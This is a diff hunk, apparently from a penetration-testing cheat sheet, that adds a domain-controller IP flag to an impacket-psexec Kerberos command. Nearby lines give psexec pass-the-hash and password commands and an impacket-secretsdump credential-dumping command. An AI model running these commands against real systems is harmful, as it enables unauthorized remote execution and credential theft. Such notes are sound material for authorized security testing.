@@ -21,7 +21,7 @@ impacket-psexec <DOMAIN>/<ADMIN>@<HOSTNAME>.<ETC_HOST_FQDN> -hashes <HASH>
 impacket-psexec <DOMAIN>/<ADMIN>:<PASSWORD>@<HOSTNAME>.<ETC_HOST_FQDN>
 
 # psexec via env KRB5CCNAME
-impacket-psexec -k -no-pass <HOSTNAME>.<ETC_HOST_FQDN>
+impacket-psexec -k -no-pass <HOSTNAME>.<ETC_HOST_FQDN> -dc-ip <DC_IP>
 
 # secretsdump
 impacket-secretsdump <DOMAIN>/<VICTIM>@<ETC_HOST_FQDN> -hashes <LMHASH>:<NTHASH>
